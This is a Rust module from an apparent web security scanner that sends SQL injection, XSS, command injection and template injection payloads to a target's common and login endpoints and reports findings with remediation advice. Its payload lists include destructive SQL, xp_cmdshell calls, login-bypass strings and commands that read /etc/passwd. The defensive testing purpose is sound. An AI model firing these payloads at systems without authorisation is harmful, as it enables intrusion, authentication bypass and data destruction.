//! Injection Probes — OWASP A01/A02/A08
//!
//! Tests for SQL Injection, XSS (Reflected), Command Injection, SSTI,
//! and Prompt Injection.

use std::sync::Arc;
use std::time::Duration;

use anyhow::Result;
use reqwest::Client;
use tokio::sync::Semaphore;
use tracing::debug;
use uuid::Uuid;

use crate::models::{Finding, FindingSource, OwaspCategory, Severity};

// ── SQL Injection Payloads ────────────────────────────────────────────────────

static SQLI_PAYLOADS: &[&str] = &[
    // Error-based
    "'",
    "''",
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR 1=1--",
    "' OR 1=1#",
    "admin'--",
    "admin' #",
    // UNION-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
    "' UNION SELECT username,password FROM users--",
    // Boolean blind
    "' AND 1=1--",
    "' AND 1=2--",
    "' AND 'a'='a",
    "' AND 'a'='b",
    // Time-based blind
    "'; WAITFOR DELAY '0:0:5'--",           // MSSQL
    "'; SELECT SLEEP(5)--",                  // MySQL
    "'; SELECT pg_sleep(5)--",              // PostgreSQL
    "1; WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
    // NoSQL
    "{ \"$gt\": \"\" }",
    "' || '1'=='1",
    // Second-order
    "admin'/*",
    "' OR 'x'='x",
    "'; EXEC xp_cmdshell('whoami'); --",
];

// ── XSS Payloads ──────────────────────────────────────────────────────────────

static XSS_PAYLOADS: &[&str] = &[
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "javascript:alert('XSS')",
    "'><script>alert('XSS')</script>",
    "\"><script>alert('XSS')</script>",
    "<ScRiPt>alert('XSS')</ScRiPt>",
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<img src=\"x\" onerror=\"alert('XSS')\">",
    "<body onload=alert('XSS')>",
    "&#x3C;script&#x3E;alert('XSS')&#x3C;/script&#x3E;",
    "%3Cscript%3Ealert('XSS')%3C/script%3E",
    "<a href=\"javascript:alert('XSS')\">click</a>",
    "<details open ontoggle=alert('XSS')>",
    "<iframe src=\"javascript:alert('XSS')\">",
    "<input autofocus onfocus=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<video><source onerror=alert('XSS')>",
    "<object data=\"javascript:alert('XSS')\">",
    "<<SCRIPT>alert('XSS');//<</SCRIPT>",
];

// ── Command Injection Payloads ────────────────────────────────────────────────

static CMDI_PAYLOADS: &[&str] = &[
    "; ls",
    "| ls",
    "& ls",
    "`ls`",
    "$(ls)",
    "; whoami",
    "| whoami",
    "& whoami",
    "`whoami`",
    "$(whoami)",
    "; cat /etc/passwd",
    "| cat /etc/passwd",
    "; dir",
    "& dir",
    "| dir",
    "; id",
    "| id",
    "& id",
    "`id`",
    "$(id)",
];

// ── SSTI Payloads ─────────────────────────────────────────────────────────────

static SSTI_PAYLOADS: &[(&str, &str)] = &[
    ("{{7*7}}", "49"),       // Jinja2/Twig/Handlebars
    ("${7*7}", "49"),        // Java EL / FreeMarker
    ("#{7*7}", "49"),        // Th:leaf
    ("<%= 7*7 %>", "49"),   // ERB
    ("{{7*'7'}}", "7777777"), // Jinja2 string multiply
    ("${{7*7}}", "49"),
    ("*{7*7}", "49"),        // Spring EL
];

// ── Detection Patterns ────────────────────────────────────────────────────────

/// SQL error patterns that indicate SQLi success
static SQL_ERROR_PATTERNS: &[&str] = &[
    // MySQL
    "You have an error in your SQL syntax",
    "Warning: mysql_",
    "mysql_fetch",
    "Mysql server version for the right syntax",
    "Column count doesn't match",
    // PostgreSQL
    "pg_query()",
    "syntax error at or near",
    "ERROR:  unterminated quoted string",
    "ERROR:  syntax error",
    // MSSQL
    "Microsoft OLE DB Provider for SQL Server",
    "Unclosed quotation mark after the character string",
    "Incorrect syntax near",
    "[SQL Server]",
    // Oracle
    "ORA-01756",
    "ORA-00907",
    "ORA-00933",
    // SQLite
    "SQLite3::query",
    "SQLiteException",
    "unrecognized token:",
    // Generic
    "SQLSTATE",
    "JDBC",
    "sql syntax",
    // Boolean-based: identical 200 with different bodies signals possible blind
    // (handled separately in probe_sqli_post_body)
];

// ── Main Entry ────────────────────────────────────────────────────────────────

pub async fn run(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    target: &str,
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    // Collect common injectable endpoints by probing the base URL
    let test_urls = build_test_urls(target);

    findings.extend(probe_sqli(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    // POST-body SQLi targets login/auth endpoints specifically
    findings.extend(probe_sqli_post_body(Arc::clone(&client), Arc::clone(&sem), target).await?);
    findings.extend(probe_xss(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    findings.extend(probe_cmdi(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);
    findings.extend(probe_ssti(Arc::clone(&client), Arc::clone(&sem), &test_urls).await?);

    Ok(findings)
}

/// Build a list of test URLs from the base target
fn build_test_urls(target: &str) -> Vec<String> {
    let base = target.trim_end_matches('/');
    vec![
        format!("{}/?id=1", base),
        format!("{}/search?q=test", base),
        format!("{}/login", base),
        format!("{}/api/user?id=1", base),
        format!("{}/api/search?query=test", base),
        format!("{}/product?id=1", base),
        format!("{}/page?num=1", base),
        format!("{}/view?item=1", base),
    ]
}

// ── SQL Injection ─────────────────────────────────────────────────────────────

async fn probe_sqli(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    let baseline_checks: Vec<_> = urls
        .iter()
        .map(|url| {
            let client = Arc::clone(&client);
            let sem = Arc::clone(&sem);
            let url = url.clone();
            async move {
                let _permit = sem.acquire().await.unwrap();
                client.get(&url).send().await.ok().map(|r| (url, r.status()))
            }
        })
        .collect();

    for url in urls {
        for payload in SQLI_PAYLOADS.iter().take(15) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            let matched_pattern = SQL_ERROR_PATTERNS
                .iter()
                .find(|&&p| body.contains(p));

            if let Some(pattern) = matched_pattern {
                debug!("SQLi detected at {} with payload: {}", url, payload);
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::BrokenAccessControl,
                    severity: Severity::Critical,
                    title: "SQL Injection".to_string(),
                    description: format!(
                        "SQL injection vulnerability detected. The payload `{}` triggered a database error: '{}'.",
                        payload, pattern
                    ),
                    evidence: Some(format!("GET {}\nPayload: {}\nError: {}", test_url, payload, pattern)),
                    remediation: "Use parameterized queries (prepared statements). Never concatenate user input into SQL. Apply input validation and least-privilege DB accounts.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break; // One confirmed finding per URL is enough
            }
        }
    }

    Ok(findings)
}

// ── SQL Injection via POST body (login forms) ─────────────────────────────────
//
// Most login pages accept credentials as JSON or form-encoded POST bodies.
// The GET-only probe above misses these entirely.
//
// Strategy:
//  1. For each login-like endpoint, send a baseline POST with dummy creds and
//     record the status and response length.
//  2. Re-POST with a SQLi payload in the email/username field.
//  3. Flag if:
//     a) A SQL error pattern appears in the response body, OR
//     b) A "true" boolean payload (e.g. `' OR '1'='1`) returns 200/302 while
//        a "false" payload (e.g. `' AND '1'='2`) returns 401/403 — classic
//        blind boolean SQLi on a login endpoint.

/// Login-like path suffixes to probe
static LOGIN_PATHS: &[&str] = &[
    "/login",
    "/signin",
    "/api/login",
    "/api/signin",
    "/api/auth/login",
    "/api/user/login",
    "/api/users/login",
    "/auth/login",
    "/account/login",
    "/user/login",
    "/rest/user/login",  // OWASP Juice Shop
    "/rest/user/signin",
];

/// Payloads that should make a vulnerable login succeed (boolean-true)
static SQLI_LOGIN_TRUE: &[(&str, &str)] = &[
    // email field injections
    ("' OR '1'='1'--",         "password"),
    ("' OR 1=1--",             "password"),
    ("' OR 1=1#",              "password"),
    ("admin'--",               "password"),
    ("' OR 'x'='x",            "password"),
    ("' OR '1'='1'/*",         "password"),
    // UNION-based — leak first row
    ("' UNION SELECT '1','2','3'--", "password"),
];

/// Corresponding "false" payload that should NOT bypass auth
const SQLI_LOGIN_FALSE: (&str, &str) = ("' AND '1'='2'--", "password");

async fn probe_sqli_post_body(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    base: &str,
) -> Result<Vec<Finding>> {
    use serde_json::json;

    let base = base.trim_end_matches('/');
    let mut findings = Vec::new();

    for path in LOGIN_PATHS {
        let url = format!("{}{}", base, path);

        // ── Step 1: baseline with dummy credentials (expect 401/403/422) ───────
        let baseline_status = {
            let _permit = sem.acquire().await.unwrap();
            client
                .post(&url)
                .header("Content-Type", "application/json")
                .body(json!({"email": "notarealuserthatexists@valinhall.invalid", "password": "Str0ngP@ss!"}).to_string())
                .send()
                .await
                .map(|r| r.status().as_u16())
                .unwrap_or(0)
        };

        // If we get a 404 this path doesn't exist — skip it
        if baseline_status == 0 || baseline_status == 404 || baseline_status == 405 {
            continue;
        }

        debug!("SQLi POST: {} baseline={}", url, baseline_status);

        // ── Step 2: try each true-condition SQLi payload ─────────────────────
        for (email_payload, pass_payload) in SQLI_LOGIN_TRUE {
            // Send as JSON (most modern APIs)
            let json_body = json!({
                "email": email_payload,
                "password": pass_payload
            })
            .to_string();

            let _permit = sem.acquire().await.unwrap();
            let resp = match client
                .post(&url)
                .header("Content-Type", "application/json")
                .body(json_body)
                .send()
                .await
            {
                Ok(r) => r,
                Err(_) => continue,
            };

            let inject_status = resp.status().as_u16();
            let body = resp.text().await.unwrap_or_default();

            // ── Detection A: SQL error in response body ─────────────────────
            if let Some(pattern) = SQL_ERROR_PATTERNS.iter().find(|&&p| body.contains(p)) {
                debug!("SQLi POST error-based at {}: '{}'", url, pattern);
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::BrokenAccessControl,
                    severity: Severity::Critical,
                    title: "SQL Injection (POST Body — Error-Based)".to_string(),
                    description: format!(
                        "The login endpoint `{}` leaks a SQL error when a crafted payload \
                         is sent in the POST body. Payload `{}` triggered: \"{}\".",
                        url, email_payload, pattern
                    ),
                    evidence: Some(format!(
                        "POST {}\nPayload email: {}\nSQL error: {}",
                        url, email_payload, pattern
                    )),
                    remediation: "Use parameterised queries (prepared statements). Never concatenate POST body fields into SQL. Suppress detailed DB errors in production responses.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(url.clone()),
                });
                break;
            }

            // ── Detection B: Boolean-based blind ────────────────────────────
            // True-condition payload succeeds (2xx/302) while baseline was 401/403
            let true_succeeded = inject_status < 400
                && (baseline_status == 401 || baseline_status == 403 || baseline_status == 422);

            if true_succeeded {
                // Now verify the false-condition payload still fails
                let false_json = json!({
                    "email": SQLI_LOGIN_FALSE.0,
                    "password": SQLI_LOGIN_FALSE.1
                })
                .to_string();
                let _permit2 = sem.acquire().await.unwrap();
                let false_status = client
                    .post(&url)
                    .header("Content-Type", "application/json")
                    .body(false_json)
                    .send()
                    .await
                    .map(|r| r.status().as_u16())
                    .unwrap_or(0);

                // True succeeds + false fails — confirmed blind boolean SQLi
                if false_status >= 400 {
                    debug!("SQLi POST boolean-blind at {}: true={} false={}",
                        url, inject_status, false_status);
                    findings.push(Finding {
                        id: Uuid::new_v4().to_string(),
                        category: OwaspCategory::BrokenAccessControl,
                        severity: Severity::Critical,
                        title: "SQL Injection (POST Body — Boolean-Blind Authentication Bypass)".to_string(),
                        description: format!(
                            "The login endpoint `{}` is vulnerable to SQL injection via the POST body. \
                             The \"always-true\" payload `{}` in the email field returns HTTP {} (login \
                             succeeds), while the \"always-false\" payload `{}` returns HTTP {} (login \
                             fails). This differential confirms boolean-blind SQLi and allows an attacker \
                             to bypass authentication entirely.",
                            url, email_payload, inject_status,
                            SQLI_LOGIN_FALSE.0, false_status
                        ),
                        evidence: Some(format!(
                            "POST {}\nTrue payload email: {} → HTTP {}\nFalse payload email: {} → HTTP {}",
                            url, email_payload, inject_status, SQLI_LOGIN_FALSE.0, false_status
                        )),
                        remediation: "Use parameterised queries (prepared statements). Validate and sanitize all POST body fields. Never construct SQL from login form input.".to_string(),
                        source: FindingSource::Dast,
                        endpoint: Some(url.clone()),
                    });
                    break;
                }
            }

            // ── Also try form-encoded for legacy apps ─────────────────────────
            let _permit3 = sem.acquire().await.unwrap();
            let form_resp = client
                .post(&url)
                .form(&[("email", *email_payload), ("password", *pass_payload)])
                .send()
                .await;
            if let Ok(r) = form_resp {
                let form_status = r.status().as_u16();
                let form_body = r.text().await.unwrap_or_default();
                if let Some(pattern) = SQL_ERROR_PATTERNS.iter().find(|&&p| form_body.contains(p)) {
                    findings.push(Finding {
                        id: Uuid::new_v4().to_string(),
                        category: OwaspCategory::BrokenAccessControl,
                        severity: Severity::Critical,
                        title: "SQL Injection (Form POST — Error-Based)".to_string(),
                        description: format!(
                            "The login endpoint `{}` leaks a SQL error when a crafted payload \
                             is submitted as an HTML form POST. Payload `{}` triggered: \"{}\".",
                            url, email_payload, pattern
                        ),
                        evidence: Some(format!(
                            "POST {} (form-encoded)\nPayload email: {}\nSQL error: {}",
                            url, email_payload, pattern
                        )),
                        remediation: "Use parameterised queries (prepared statements).".to_string(),
                        source: FindingSource::Dast,
                        endpoint: Some(url.clone()),
                    });
                    break;
                }
                let _ = form_status; // suppress unused warning
            }
        }
    }

    Ok(findings)
}

// ── XSS ───────────────────────────────────────────────────────────────────────

async fn probe_xss(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    for url in urls {
        for payload in XSS_PAYLOADS.iter().take(10) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            // Check content type before looking for reflected payload
            let ct = response
                .headers()
                .get("content-type")
                .and_then(|v| v.to_str().ok())
                .unwrap_or("")
                .to_string();

            if !ct.contains("text/html") {
                continue;
            }

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            if body.contains(payload) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::BrokenAccessControl,
                    severity: Severity::High,
                    title: "Reflected Cross-Site Scripting (XSS)".to_string(),
                    description: format!(
                        "The payload `{}` was reflected unencoded in the HTML response, indicating a reflected XSS vulnerability.",
                        payload
                    ),
                    evidence: Some(format!("GET {}\nPayload reflected in response body", test_url)),
                    remediation: "HTML-encode all user-supplied output. Implement a Content-Security-Policy. Use modern frontend frameworks that auto-escape output.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── Command Injection ─────────────────────────────────────────────────────────

async fn probe_cmdi(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();
    let unix_indicators = ["root:x:0:0", "daemon", "/bin/bash", "uid=", "www-data"];
    let win_indicators = ["Windows IP", "Volume Serial", "Directory of"];

    for url in urls {
        for payload in CMDI_PAYLOADS.iter().take(10) {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            let all_indicators: Vec<&str> = unix_indicators.iter().chain(win_indicators.iter()).copied().collect();
            if let Some(indicator) = all_indicators.iter().find(|&&i| body.contains(i)) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::IntegrityFailures,
                    severity: Severity::Critical,
                    title: "Command Injection".to_string(),
                    description: format!(
                        "OS command injection confirmed. The payload `{}` caused command output '{}' to appear in the response.",
                        payload, indicator
                    ),
                    evidence: Some(format!("GET {}\nPayload: {}\nResponse contained: {}", test_url, payload, indicator)),
                    remediation: "Never pass user input to shell commands. Use language APIs that accept argument lists. Apply strict input allowlisting.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── SSTI ─────────────────────────────────────────────────────────────────────

async fn probe_ssti(
    client: Arc<Client>,
    sem: Arc<Semaphore>,
    urls: &[String],
) -> Result<Vec<Finding>> {
    let mut findings = Vec::new();

    for url in urls {
        for (payload, expected) in SSTI_PAYLOADS {
            let test_url = inject_payload(url, payload);
            let _permit = sem.acquire().await.unwrap();

            let response = match client.get(&test_url).send().await {
                Ok(r) => r,
                Err(_) => continue,
            };

            let body = match response.text().await {
                Ok(b) => b,
                Err(_) => continue,
            };

            if body.contains(expected) {
                findings.push(Finding {
                    id: Uuid::new_v4().to_string(),
                    category: OwaspCategory::IntegrityFailures,
                    severity: Severity::Critical,
                    title: "Server-Side Template Injection (SSTI)".to_string(),
                    description: format!(
                        "The template expression `{}` was evaluated server-side (output: `{}`), indicating SSTI. This can lead to remote code execution.",
                        payload, expected
                    ),
                    evidence: Some(format!("GET {}\nExpression: {} → {}", test_url, payload, expected)),
                    remediation: "Never allow user input to be interpreted as a template. Use sandboxed rendering. Upgrade or patch the template engine.".to_string(),
                    source: FindingSource::Dast,
                    endpoint: Some(test_url),
                });
                break;
            }
        }
    }

    Ok(findings)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

/// Injects a payload into the last query parameter value
fn inject_payload(url: &str, payload: &str) -> String {
    if url.contains('=') {
        let encoded = urlencoding::encode(payload).to_string();
        // Replace the last parameter value
        if let Some(pos) = url.rfind('=') {
            format!("{}{}", &url[..=pos], encoded)
        } else {
            url.to_string()
        }
    } else {
        format!("{}?input={}", url, urlencoding::encode(payload))
    }
}
